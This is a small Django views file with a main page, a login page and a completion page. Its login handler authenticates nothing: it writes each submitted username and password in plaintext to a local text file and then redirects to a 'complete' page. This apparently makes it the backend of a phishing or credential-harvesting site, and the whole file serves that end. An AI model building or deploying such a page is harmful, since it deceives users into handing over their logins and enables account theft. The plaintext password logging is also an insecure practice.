from django.shortcuts import render , redirect
from django.views import View

class MainPage(View):
    def get(self,request):
        return render(request,'main/main_page_template.html')
    
class LoginPage(View):
    def get(self,request):
        return render(request,'main/login_page_template.html')
    
    def post(self,request):
        username = request.POST['username']
        password = request.POST['password']
        file = open('usernames and passwords.txt','a')
        file.write('[info]')
        file.write('\n')
        file.write(f'username : {username}')
        file.write('\n')
        file.write(f'password : {password}')
        file.write('\n')
        file.write('[info]')
        file.write('\n')
        file.close()
        return redirect('complete_page')
    
class CompletePage(View):
    def get(self,request):
        return render(request,'main/complete_page_template.html')